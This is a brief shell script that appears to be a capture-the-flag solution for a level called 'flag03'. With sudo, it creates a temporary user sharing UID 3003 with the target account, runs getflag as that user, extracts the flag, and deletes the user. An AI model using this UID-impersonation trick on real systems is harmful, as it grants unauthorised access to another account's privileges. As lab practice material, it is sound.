#!/bin/sh -eu

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3003 \
  flag03
echo -n 'flag03: '
sudo -u flag03 getflag | egrep -o '[^ ]+$'
sudo userdel flag03
